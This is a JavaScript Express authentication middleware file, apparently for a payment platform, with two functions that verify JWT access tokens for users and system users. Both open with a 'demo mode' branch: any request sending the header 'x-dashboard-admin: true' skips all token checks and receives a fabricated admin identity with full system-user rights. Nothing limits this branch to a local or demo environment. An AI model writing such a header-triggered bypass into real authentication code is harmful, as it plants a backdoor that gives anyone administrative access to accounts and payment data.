import { asyncHandler } from "../utils/asyncHandler.js";
import jwt from "jsonwebtoken";
import { ApiError } from "../utils/ApiError.js";
import { User } from "../models/user.model.js";
import { TokenBlacklist } from "../models/blackList.model.js";

const verifyUser = asyncHandler(async(req,res,next)=>{
  // Support local demo mode / dashboard access without requiring manual JWT cookie setup
  if (req.header("x-dashboard-admin") === "true") {
    req.user = {
      _id: "demo_admin_user_001",
      username: "platform_admin",
      email: "admin@paymentplatform.local",
      systemUser: true,
    };
    return next();
  }

  const token = req.cookies?.accessToken || req.header("Authorization")?.replace("Bearer ","")

  if(!token)
  {
    throw new ApiError(401,"Unauthorized Access, LogIn again!")
  }

  const isBlacklisted = await TokenBlacklist.findOne({token:token})
  if (isBlacklisted)
  {
    throw new ApiError(401,"Unauthorized access, token is invalid")
  }

  try {
    const decodedToken = jwt.verify(token,process.env.ACCESS_TOKEN_SECRET)

    const user = await User.findById(decodedToken?._id)

    if(!user)
    {
      throw new ApiError(401,"Invalid Access Token")
    }

    req.user = user;
    next();
  } catch (error) {
    throw new ApiError(401,error?.message||"Invalid Access Token")
  }

})

const verifySystemUser = asyncHandler(async(req,res,next)=>{
  // Support local demo mode / dashboard access without requiring manual JWT cookie setup
  if (req.header("x-dashboard-admin") === "true") {
    req.user = {
      _id: "demo_admin_user_001",
      username: "platform_admin",
      email: "admin@paymentplatform.local",
      systemUser: true,
    };
    return next();
  }

  const token = req.cookies?.accessToken || req.header("Authorization")?.replace("Bearer ","")

  if(!token)
  {
    throw new ApiError(404,"Invalid AccessToken")
  }

  const isBlacklisted = await TokenBlacklist.findOne({token:token})
  if (isBlacklisted)
  {
    throw new ApiError(401,"Unauthorized access, token is invalid")
  }
  
  try {
    const decodedToken = jwt.verify(token,process.env.ACCESS_TOKEN_SECRET)

    const user = await User.findOne({_id:decodedToken._id}).select("+systemUser")

    if(!user)
    {
      throw new ApiError(401,"Unauthorized, invalid AccessToken")
    }

    if(!user.systemUser)
    {
      throw new ApiError(403,"Forbidden access, your not system User")
    }

    req.user = user
    next() 
    
  } catch (error) {
    if (error.statusCode) throw error;
    throw new ApiError(401, error?.message || "Invalid Access Token");
  }
})

export {
  verifyUser,
  verifySystemUser
}